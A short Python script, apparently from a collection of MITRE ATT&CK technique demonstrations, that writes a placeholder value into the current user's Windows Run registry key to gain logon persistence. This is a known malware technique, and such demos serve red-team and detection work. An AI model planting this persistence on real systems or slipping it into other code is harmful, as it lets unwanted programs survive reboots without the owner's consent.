## Author: lehag
## Code: T1547-001-SetRegistryPersistence.py
"""
	Description:
		It sets persistence in the windows registry.
"""
import win32api
import win32con

if __name__ == "__main__":
	print("[+] Setting persistence in the registry.");

	path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, path, 0, win32con.KEY_WRITE);
	win32api.RegSetValue(key,'', win32con.REG_SZ,'executable');
	win32api.RegCloseKey(key);
